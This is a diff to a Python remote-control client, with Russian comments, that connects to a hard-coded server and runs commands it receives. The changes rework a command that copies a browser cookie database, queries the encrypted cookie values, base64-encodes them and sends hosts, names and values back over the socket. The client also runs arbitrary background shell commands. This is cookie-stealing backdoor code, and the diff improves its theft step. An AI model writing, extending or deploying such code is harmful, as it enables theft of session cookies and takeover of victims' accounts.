@@ -4,6 +4,9 @@ import os
 import sys
 import time
 import re
+import tempfile
+import shutil
+import sqlite3
 
 SERVER_IP = "192.168.100.3"  # IP сервера
 SERVER_PORT = 5000
@@ -98,13 +101,9 @@ def main():
                             s.send("NOT_FOUND".encode())
                         continue
 
-                    # Выполнение sqlite3 запроса к базе куков, выбирается поле value (открытое значение)
+                    # Выполнение sqlite3 запроса к базе куков, поле encrypted_value (бинарные данные в sqlite)
                     if cmd.startswith("sqlite3_query:"):
                         try:
-                            import tempfile
-                            import shutil
-                            import sqlite3
-
                             payload = cmd[len("sqlite3_query:"):].strip()
                             file_path, sql = payload.split(" ", 1)
                             file_path = os.path.expanduser(file_path)
@@ -124,18 +123,23 @@ def main():
                             if not rows:
                                 s.send("NO_RESULTS".encode())
                             else:
+                                import base64
                                 lines = []
                                 for row in rows:
                                     host = str(row[0])
                                     name = str(row[1])
-                                    value = str(row[2] if row[2] is not None else "")
-                                    lines.append(f"{host} | {name} | {value}")
+                                    encrypted_value = row[2]
+                                    if encrypted_value is None:
+                                        encoded_val = ""
+                                    else:
+                                        encoded_val = base64.b64encode(encrypted_value).decode()
+                                    lines.append(f"{host} | {name} | {encoded_val}")
                                 s.send("\n".join(lines).encode())
                         except Exception as e:
                             s.send(f"ERROR: {e}".encode())
                         continue
 
-                    # Обычные фоновые команды через setsid
+                    # Фоновые команды через setsid
                     if "nohup" in cmd or cmd.endswith('&'):
                         try:
                             m = re.search(r'python3\s+"([^"]+)"', cmd)
